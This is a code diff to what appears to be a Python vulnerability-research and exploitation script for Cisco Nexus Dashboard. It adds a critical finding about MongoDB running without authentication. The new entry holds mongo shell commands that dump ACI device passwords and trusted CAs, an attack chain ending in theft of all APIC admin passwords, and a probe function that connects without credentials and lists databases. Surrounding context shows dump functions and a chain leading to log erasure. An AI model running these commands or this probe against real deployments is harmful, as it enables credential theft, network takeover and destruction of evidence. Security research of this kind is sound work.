@@ -27,7 +27,7 @@ Container stack (atomix.yaml, 20 core + 200+ app containers):
   apps/cisco-ndfc: 32 NDFC (fabric controller) services
   apps/cisco-nir: 60+ NIR telemetry analysis services
 
-Findings: ND-F01 (CRITICAL) through ND-F21 (CRITICAL)
+Findings: ND-F01 (CRITICAL) through ND-F22 (CRITICAL)
 """
 
 import socket
@@ -724,6 +724,47 @@ FINDINGS = {
         ),
         "chain": "ND-F21 no-auth OpenSearch -> dump ND telemetry/audit -> log erasure (evidence destruction)",
     },
+    "ND-F22": {
+        "title": "MongoDB No Authentication — Direct Cluster DB Access via TLS-Only Connection",
+        "severity": "CRITICAL",
+        "component": "infra/mongodb container (mongod.yaml, entrypoint.sh)",
+        "description": (
+            "mongod.yaml ships without a 'security.authorization' field; "
+            "entrypoint.sh only enables --auth when both MONGO_INITDB_ROOT_USERNAME "
+            "and MONGO_INITDB_ROOT_PASSWORD environment variables are set. "
+            "Neither env var is configured in ND's K8s manifests — MongoDB starts "
+            "without authentication on every ND deployment. "
+            "net.bindIpAll: true binds on 0.0.0.0:27017. TLS is required (requireTLS) "
+            "but is server-only — no client certificate auth. The cluster CA cert "
+            "(cacerts.crt, distributed to all ND services and exposed via confd "
+            "/api/debug/ endpoints per ND-F16) is sufficient to connect. "
+            "All common.sh _mongo_cmd* functions use --tls --tlsCAFile with no "
+            "--username/--password args, confirming no auth is expected. "
+            "Databases at risk: securitymgr (ACI/Nexus device credentials — ND-F18), "
+            "confd (trusted CA certs, API keys, device RBAC — ND-F16), "
+            "aaaserver (TrustedJWTKeys — ND-F10), "
+            "apigw (Tyk API definitions, session tokens), "
+            "all 22 MSO + 32 NDFC + 60 NIR application databases. "
+            "Direct MongoDB access bypasses all HTTP API auth layers."
+        ),
+        "port": 27017,
+        "bind": "0.0.0.0",
+        "tls": "requireTLS (server-only, no client cert auth)",
+        "auth_enabled": False,
+        "databases_at_risk": [
+            "securitymgr — ACI APIC admin passwords + Nexus device credentials",
+            "confd — trusted CAs, API keys, device RBAC data",
+            "aaaserver — TrustedJWTKeys (admin JWT forge surface)",
+            "apigw — Tyk session tokens, API definitions",
+            "MSO/NDFC/NIR application data (22+32+60 services)",
+        ],
+        "exploit": (
+            "mongo --tls --tlsCAFile cacerts.crt --ipv6 --host mongodb.mongodb.svc:27017\n"
+            "use securitymgr; db.credentials.find()  # dump ACI device passwords\n"
+            "use confd; db.trustedcas.find()  # dump all cluster trusted CAs"
+        ),
+        "chain": "ND-F22 no-auth MongoDB -> securitymgr cred dump -> all ACI APIC admin passwords",
+    },
 }
 
 
@@ -1152,6 +1193,41 @@ def probe_opensearch_anon(host: str, port: int = 9200) -> dict:
         return {"http_error": e.code, "authenticated_required": e.code == 401, "finding": "ND-F21"}
     except Exception as e:
         return {"error": str(e), "finding": "ND-F21"}
+
+
+def probe_mongodb_noauth(host: str, port: int = 27017, ca_cert: str = "") -> dict:
+    """
+    Test MongoDB for no-auth access. ND-F22: mongod.yaml ships without security.authorization.
+    Requires TLS (--tls --tlsCAFile), no credentials needed.
+    Use with the ND cluster CA cert from confd debug endpoint (ND-F16).
+    Returns subprocess output — requires 'mongo' binary on PATH.
+    """
+    cmd = [
+        "mongo",
+        "--tls",
+        "--tlsCAFile", ca_cert or "/tmp/nd-cacerts.crt",
+        "--ipv6",
+        "--host", f"{host}:{port}",
+        "--quiet",
+        "--eval", "JSON.stringify(db.adminCommand({listDatabases: 1}))",
+    ]
+    try:
+        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
+        if result.returncode == 0:
+            dbs = json.loads(result.stdout.strip().split("\n")[-1])
+            return {
+                "auth_required": False,
+                "databases": [d["name"] for d in dbs.get("databases", [])],
+                "total_size_bytes": dbs.get("totalSize", 0),
+                "finding": "ND-F22",
+            }
+        return {"error": result.stderr[:200], "finding": "ND-F22"}
+    except subprocess.TimeoutExpired:
+        return {"error": "timeout", "finding": "ND-F22"}
+    except FileNotFoundError:
+        return {"error": "mongo binary not found — install mongodb-clients", "finding": "ND-F22"}
+    except Exception as e:
+        return {"error": str(e), "finding": "ND-F22"}
 
 
 def dump_opensearch_index(host: str, index: str, port: int = 9200, size: int = 10) -> dict:
